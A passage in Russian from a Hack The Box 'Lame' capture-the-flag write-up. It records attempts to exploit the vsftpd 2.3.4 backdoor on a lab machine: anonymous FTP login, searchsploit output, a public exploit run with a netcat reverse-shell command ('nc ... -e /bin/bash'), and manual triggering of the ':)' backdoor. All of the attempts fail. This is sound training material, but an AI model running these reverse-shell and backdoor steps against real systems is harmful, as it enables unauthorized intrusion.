
# FTP Сервер

## Перечисление файлов на FTP

Я попробовал имитировать анонимный вход:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/lame]
└─$ ftp 10.10.10.3
Connected to 10.10.10.3.
220 (vsFTPd 2.3.4)
Name (10.10.10.3:mac): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
```

Это также вывело название версии FTP.

Я попробовал перечислить файлы перед чем-либо еще:

```bash
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
226 Directory send OK.
```

Ничего не было.

## Попытка эксплуатации VSFTP

Я запустил `searchsploit` против `vsftpd`:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/lame]
└─$ searchsploit vsftpd
----------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                         |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
vsftpd 2.0.5 - 'CWD' (Authenticated) Remote Memory Consumption                                                                                                         | linux/dos/5814.pl
vsftpd 2.0.5 - 'deny_file' Option Remote Denial of Service (1)                                                                                                         | windows/dos/31818.sh
vsftpd 2.0.5 - 'deny_file' Option Remote Denial of Service (2)                                                                                                         | windows/dos/31819.pl
vsftpd 2.3.2 - Denial of Service                                                                                                                                       | linux/dos/16270.c
vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)                                                                                                                 | unix/remote/17491.rb
----------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Похоже, есть эксплой для версии 2.3.4. [Rapid7](https://www.rapid7.com/db/modules/exploit/unix/ftp/vsftpd_234_backdoor/) дает хорошую общую информацию о том, как он был внедрен.

Был модуль Metasploit, который мы не хотим использовать. Я нашел похожий python эксплой:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/lame]
└─$ git clone https://github.com/ahervias77/vsftpd-2.3.4-exploit.git
```

Код, похоже, не рассказывает много о том, как он работает, но выглядит так, что он использует сокет для установки прямого соединения, а затем передает команду. Похоже, код эксплуатирует известный эксплой, внедренный в кодбазу `vsftp`.

Давайте попробуем netcat reverse shell. Сначала настроим слушатель:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/lame]
└─$ nc -lnvp 9001
listening on [any] 9001 ...
```

Затем попробуем отправить сокет с шелл на наш сервер:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/lame/vsftpd-2.3.4-exploit]
└─$ python3 vsftpd_234_exploit.py 10.10.10.3 21 'nc 10.10.14.13 9001 -e /bin/bash'
[*] Attempting to trigger backdoor...
[+] Triggered backdoor
[*] Attempting to connect to backdoor...
```

Это застряло на некоторое время. Я в конце концов завершил его и попробовал более простую команду.

```bash
┌──(mac㉿kali)-[~/Documents/HTB/lame/vsftpd-2.3.4-exploit]
└─$ python3 vsftpd_234_exploit.py 10.10.10.3 21 id
[*] Attempting to trigger backdoor...
[+] Triggered backdoor
[*] Attempting to connect to backdoor...
```

Ничего не вышло.

## Попытка эксплойу вручную

Вместо этого я попробовал эксплуатировать его вручную, на случай если эксплой сломан. Я следовал [отличному руководству](https://www.hackingtutorials.org/metasploit-tutorials/exploiting-vsftpd-metasploitable/) для этого, с интересным описанием кода эксплойта:

![[Pasted image 20210503225240.png]]

Эксплой включает активацию эксплойа путем подключения к порту 21 и передачи имени пользователя с смайликом `:)`. Затем эксплой должен открыться на порту 6200 и дать вам шелл:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/lame/vsftpd-2.3.4-exploit]
└─$ telnet 10.10.10.3 21
Trying 10.10.10.3...
Connected to 10.10.10.3.
Escape character is '^]'.
220 (vsFTPd 2.3.4)
USER user:)
331 Please specify the password.
PASS pass
^]
telnet> Connection closed.
┌──(mac㉿kali)-[~/Documents/HTB/lame/vsftpd-2.3.4-exploit]
└─$ telnet 10.10.10.3 6200
Trying 10.10.10.3...
^C
```

Первоначальное соединение сработало, но шелл не открылся. Мы также можем попробовать netcat:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/lame/vsftpd-2.3.4-exploit]
└─$ nc 10.10.10.3 21
220 (vsFTPd 2.3.4)
USER user:)
331 Please specify the password.
PASS pass
500 OOPS: priv_sock_get_result
```

Ничего не вышло. Используя `nmap`, мы можем увидеть, что порт не открыт:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/lame/vsftpd-2.3.4-exploit]
└─$ nmap -Pn -p 6200 10.10.10.3
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-03 21:35 BST
Nmap scan report for 10.10.10.3
Host is up.

PORT     STATE    SERVICE
6200/tcp filtered lm-x

Nmap done: 1 IP address (1 host up) scanned in 2.17 seconds
```

Это говорит, что мы, вероятно, не можем использовать этот эксплой.

# Теги

#writeup #oscp-prep #cve #ftp
